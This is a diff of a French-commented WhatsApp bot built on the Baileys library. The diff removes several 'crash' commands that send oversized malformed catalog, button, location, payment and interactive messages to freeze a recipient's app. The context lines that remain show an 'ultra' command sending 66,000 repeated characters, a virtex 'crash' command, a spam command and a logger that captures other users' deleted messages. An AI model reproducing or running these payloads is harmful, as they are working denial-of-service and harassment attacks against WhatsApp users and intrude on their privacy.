@@ -194,13 +194,10 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
     const { version } = await fetchLatestBaileysVersion();
 
-    const { Browsers } = require("@whiskeysockets/baileys");
     const sock = makeWASocket({
         version,
         printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: Browsers.macOS('Desktop'),
-        syncFullHistory: true,
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
@@ -224,28 +221,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
         }, 5000);
     }
 
-    sock.ev.on("creds.update", saveCreds)
-    // Gestion de la synchronisation de l'historique (messages hors ligne)
-    sock.ev.on("messaging-history.set", async ({ messages, chats, contacts, isLatest }) => {
-        console.log(`[${cleanNumber}] 📥 Synchronisation de l'historique : ${messages.length} messages reçus.`);
-        if (!messageCache.has(cleanNumber)) messageCache.set(cleanNumber, new Map());
-        const sessionCache = messageCache.get(cleanNumber);
-        
-        for (const m of messages) {
-            if (m.message && m.key.remoteJid !== "status@broadcast") {
-                const text = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();
-                sessionCache.set(m.key.id, { 
-                    text, 
-                    senderName: m.pushName || "Inconnu", 
-                    remoteJid: m.key.remoteJid 
-                });
-            }
-        }
-        if (isLatest) {
-            console.log(`[${cleanNumber}] ✅ Synchronisation de l'historique terminée.`);
-        }
-    });
-;
+    sock.ev.on("creds.update", saveCreds);
 
     // Anti-suppression (Log des messages supprimés)
     sock.ev.on("messages.update", async (updates) => {
@@ -308,33 +284,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
             if (lowerText === "off") { current.isBotActive = false; await sock.sendMessage(remoteJid, { text: "Stone 2 désactivé. 🛑" }); return; }
             
             // Nettoyage profond (alt-delete)
-            
-            // Commande d'extraction d'historique
-            if (lowerText.startsWith("extract")) {
-                const sessionCache = messageCache.get(cleanNumber);
-                if (!sessionCache || sessionCache.size === 0) {
-                    await sock.sendMessage(remoteJid, { text: "❌ Aucun historique en cache pour le moment." });
-                    return;
-                }
-                
-                let historyText = "*📜 EXTRACTION DE L'HISTORIQUE RÉCENT*\n\n";
-                let count = 0;
-                for (const [id, data] of sessionCache.entries()) {
-                    if (data.remoteJid === remoteJid) {
-                        historyText += `👤 *${data.senderName}* : ${data.text}\n`;
-                        count++;
-                    }
-                    if (count >= 20) break;
-                }
-                
-                if (count === 0) {
-                    await sock.sendMessage(remoteJid, { text: "❌ Aucun message trouvé dans l'historique pour cette discussion." });
-                } else {
-                    await sock.sendMessage(remoteJid, { text: historyText });
-                }
-                return;
-            }
-if (lowerText === "alt-delete") {
+            if (lowerText === "alt-delete") {
                 await sock.sendMessage(remoteJid, { text: "🧹 *NETTOYAGE PROFOND EN COURS...*\nRécupération de l'historique et suppression." });
                 let count = 0;
                 try {
@@ -465,123 +415,7 @@ if (lowerText === "alt-delete") {
                 await sock.sendMessage(remoteJid, { text: "✅ *SÉQUENCE DE CRASH TERMINÉE*" });
                 return;
             }
-            
-            // --- NOUVELLES MÉTHODES OFFENSIVES 2026 ---
-
-            // 1. Crash de Catalogue (Freeze discussion)
-            if (lowerText.startsWith("catcrash")) {
-                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU CATALOG-CRASH...*" });
-                const payload = "☣️".repeat(10000);
-                await sock.sendMessage(remoteJid, {
-                    product: {
-                        product: {
-                            productImage: { url: "https://files.catbox.moe/6uhomx.png" },
-                            productId: "stone2-crash-" + Date.now(),
-                            title: payload,
-                            description: payload,
-                            currencyCode: "USD",
-                            priceAmount1000: "999999999",
-                            retailerId: "stone2-retailer",
-                            url: "https://wa.me/stone2"
-                        },
-                        businessOwnerJid: sock.user.id
-                    }
-                });
-                await sock.sendMessage(remoteJid, { text: "✅ *CATALOG-CRASH ENVOYÉ*" });
-                return;
-            }
-
-            // 2. Boutons Malformés (Lag/Crash)
-            if (lowerText.startsWith("btncrash")) {
-                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU BUTTON-CRASH...*" });
-                const payload = "🔥".repeat(5000);
-                const buttons = [
-                    { buttonId: 'id1', buttonText: { displayText: payload }, type: 1 },
-                    { buttonId: 'id2', buttonText: { displayText: payload }, type: 1 }
-                ];
-                await sock.sendMessage(remoteJid, {
-                    text: "⚠️ System Alert",
-                    footer: payload,
-                    buttons: buttons,
-                    headerType: 1
-                });
-                await sock.sendMessage(remoteJid, { text: "✅ *BUTTON-CRASH ENVOYÉ*" });
-                return;
-            }
-
-            // 3. Localisation Fantôme (Map Crash)
-            
-            // 4. OMEGA-CRASH (Paiement & Flux - Ultra Puissant)
-            if (lowerText.startsWith("omega")) {
-                await sock.sendMessage(remoteJid, { text: "💀 *PROTOCOLE OMEGA ACTIVÉ...*" });
-                const heavyPayload = "✨".repeat(15000);
-                
-                try {
-                    // Envoi d'un message de paiement malformé
-                    await sock.sendMessage(remoteJid, {
-                        paymentInvite: {
-                            type: 1,
-                            expiryTimestamp: Date.now() + 86400000,
-                            amount: {
-                                value: 999999999,
-                                offset: 100,
-                                currencyCode: "BRL"
-                            },
-                            paymentMethod: 1,
-                            senderJid: sock.user.id,
-                            receiverJid: remoteJid,
-                            note: heavyPayload
-                        }
-                    });
-
-                    // Envoi simultané d'un flux interactif corrompu
-                    await sock.sendMessage(remoteJid, {
-                        viewOnceMessage: {
-                            message: {
-                                interactiveMessage: {
-                                    header: { title: "System Critical Error", hasMediaAttachment: false },
-                                    body: { text: heavyPayload },
-                                    footer: { text: "Omega Protocol" },
-                                    nativeFlowMessage: {
-                                        buttons: [
-                                            {
-                                                name: "single_select",
-                                                buttonParamsJson: JSON.stringify({
-                                                    title: "Click to Fix",
-                                                    sections: [{
-                                                        title: heavyPayload,
-                                                        rows: Array(20).fill({ title: "Error", rowId: "err" })
-                                                    }]
-                                                })
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    });
-                    
-                    await sock.sendMessage(remoteJid, { text: "✅ *PROTOCOLE OMEGA DÉPLOYÉ*" });
-                } catch (e) {
-                    console.error("Erreur Omega:", e);
-                    await sock.sendMessage(remoteJid, { text: "❌ Échec du protocole Omega." });
-                }
-                return;
-            }
-if (lowerText.startsWith("loccrash")) {
-                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU LOCATION-CRASH...*" });
-                await sock.sendMessage(remoteJid, {
-                    location: {
-                        degreesLatitude: 99999999,
-                        degreesLongitude: 99999999,
-                        name: "☣️".repeat(10000),
-                        address: "🔥".repeat(10000)
-                    }
-                });
-                await sock.sendMessage(remoteJid, { text: "✅ *LOCATION-CRASH ENVOYÉ*" });
-                return;
-            }
-// Commande Ultra-Crash (65000+ caractères)
+            // Commande Ultra-Crash (65000+ caractères)
             if (lowerText.startsWith("ultra")) {
                 const char = "జ్ఞా";
                 const payload = char.repeat(66000);
@@ -610,7 +444,7 @@ if (lowerText.startsWith("loccrash")) {
                 `- *s* / *sticker* : Créer un sticker (citer image/vidéo)\n` +
                 `- *save* / *vv* : Sauver un média (vue unique)\n` +
                 `- *host* : Héberger un média sur Catbox\n` +
-                `- *rappel [temps] [texte]* : Rappel (ex: 10m manger)\n- *extract* : Voir les messages synchronisés (hors ligne)\n\n` +
+                `- *rappel [temps] [texte]* : Rappel (ex: 10m manger)\n\n` +
                 `*--- ADMINISTRATION ---*\n` +
                 `- *connect [num] [mdp]* : Lancer une session\n` +
                 `- *disconnect [num] [mdp]* : Stopper une session\n` +
@@ -620,10 +454,6 @@ if (lowerText.startsWith("loccrash")) {
                 `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                 `- *crash [nombre]* : Envoi de Virtex\n` +
                 `- *ultra* : Envoi massif de caractères (65k+)\n` +
-                `- *catcrash* : Crash via Catalogue (Freeze)\n` +
-                `- *btncrash* : Crash via Boutons (Lag)\n` +
-                `- *loccrash* : Crash via Localisation (Map)\n` +
-                `- *omega* : PROTOCOLE OMEGA (Paiement & Flux - Ultra)\n` +
                 `- *stop* : Arrêter le spam en cours\n\n` +
                 `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
             
